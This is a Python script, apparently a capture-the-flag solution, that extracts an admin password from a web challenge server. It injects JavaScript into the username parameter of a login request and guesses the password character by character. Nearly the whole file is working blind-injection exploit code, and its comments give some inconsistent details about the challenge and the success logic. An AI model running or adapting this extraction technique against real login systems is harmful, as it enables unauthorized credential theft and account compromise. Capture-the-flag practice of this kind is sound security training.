import requests
import json
import sys

passw = "" #Starting known with a known format

# Need to set up headers. Particularly the Content-Type is important here.
headers = {'Connection':'keep-alive','Referer':'http://chainedin.vuln.icec.tf/login','Content-Type':'application/json;charset=utf-8'} 

# Since it is a password we know it has to be printable.
# Due to the way in which we're injecting string.printable won't work here because it goes [0-9][a-z][A-Z]
# which will cause false positives since the ascii value of lower case characters are higher than upper case characters. 
# Meaning if the password was IceCTF{I} we would have received a "positive" on IceCTF{a}, IceCTF{b}, etc
count=0
charlist="abcdefghijklmnopqrstuvwxyz!.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_" #Printable in order '}' would break the json so I left that out. I did minimal punctuation, but could have added it if the flag wasn't found.
while True: 
     for i in range(0,len(charlist)):
          
            url = 'http://army-shell.cyberstakesonline.com:39104/?username=admin\'; var d=this.password;if (d['+str(count)+']==\''+charlist[i]+'\'){return 1;}else{return 0;};foo=\'bar &password=foo&action=login'
            r = requests.get(url,headers=headers) # Build the request and post it.
            if "Invalid password" in r.text: # success condition
                passw=passw+charlist[i] # The character to cause a "positive" in this case is one too far. i.e. if 'J' is a postive then 'I' is the correct character.
                print(passw)
                count+=1
                break
            elif i >= len(charlist)-1:
                print("Your flag is: " + passw)
                sys.exit(0)
